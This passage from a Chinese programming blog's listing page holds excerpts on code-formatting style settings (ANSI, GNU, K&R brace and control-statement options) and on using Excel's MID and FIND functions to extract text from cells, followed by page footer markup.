有ANSI、GNU、K&amp;R三种编码风格可以选择。
也可以自己进行设置：
同时，这个代码格式设置还支持导入导出，使用XML文件。
另外在帮助文档里，可以搜到相关的使用说明。
相关说明
1，这里支持的文件类型是C/C++， C#， Java，这些使用类似花括号的语法。
2，你可以将修改后的设置保存成自己的编码格式。
3，如果选择一段代码，则只对选中代码进行格式化。如果不选择代码仅保留一个插入符，则对当前文件进行格式化。
相关设置
Layout and Flow
Control Statements - if, while, for, etc.
Control statements sart a new line
yes
Blank line before control statement
yes
Blank line after control statements
yes
Keep else-if on same line
yes
Force single line bodies onto next line
yes
Add braces around single statement bodies
no
Space after keywords: if, while, for, etc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37bdcc597dd51e73b1308319a1fcca78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7ed2abe2f24762b05123703aacb30eb/" rel="bookmark">
			EXCEL单元格中提取部分文本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		excel中提取单元格中间的文本 MID函数是Excel中一个强大的辅助函数，作用是从指定字符串中指定位置提取指定个数字符。
.
MID函数语法：MID(text，start_num，num_chars)
解释：text表示指定的字符串，一般为引用的单元格;
start_num表示指定位置；
num_chars表示指定个数。
.
就会常常和find函数进行嵌套使用，下面介绍一下find函数。
Find函数用来对原始数据中某个字符串进行定位，以确定其位置。
FIND函数语法：FIND(find_text,within_text,start_num)
解释：
Find_text 是要查找的字符串。
Within_text 是包含要查找关键字的单元格。就是说要在这个单元格内查找关键字
Start_num 指定开始进行查找的字符数。比如Start_num为1，则从单元格内第一个字符开始查找关键字。如果忽略 start_num，则假设其为 1。
excel提取前几个文本 那么问题来了，遇到了字体比较混乱的文本，要如何提取呢？
这里就会遇到一个关键的问题，就是如何确定我要提取的字符在单元格的第几位。我这里想要从服装的名字中提去颜色和尺码
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/105/">«</a>
	<span class="pagination__item pagination__item--current">106/220</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/107/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>